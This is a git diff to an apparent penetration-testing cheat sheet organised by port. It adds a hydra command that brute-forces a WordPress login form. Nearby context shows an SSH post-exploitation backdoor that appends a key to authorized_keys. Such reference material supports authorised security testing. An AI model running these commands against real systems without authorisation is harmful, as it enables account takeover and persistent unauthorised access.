@@ -5,6 +5,7 @@
 * [SSH - 22](#ssh---22)
   * [Brute force](#brute-force)
   * [SSH backdoor - post exploitation](#ssh-backdoor---post-exploitation)
+* [HTTP, HTTPS - 80, 443](#http-https---80-443)
 * [SNMP - 161](#snmp---161)
 * [NFS - 2049](#NFS---2049)
 * [SMB - 445](#smb---445)
@@ -58,6 +59,15 @@ echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys
 # Connect
 ssh -i <FILENAME> <USER>@<IP>
 ~~~
+
+
+# HTTP, HTTPS - 80, 443
+
+## Brute force
+
+``` bash
+hydra -L users.txt -P passwords.txt target.com -s 8081 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid" -V
+```
 
 
 # SNMP - 161
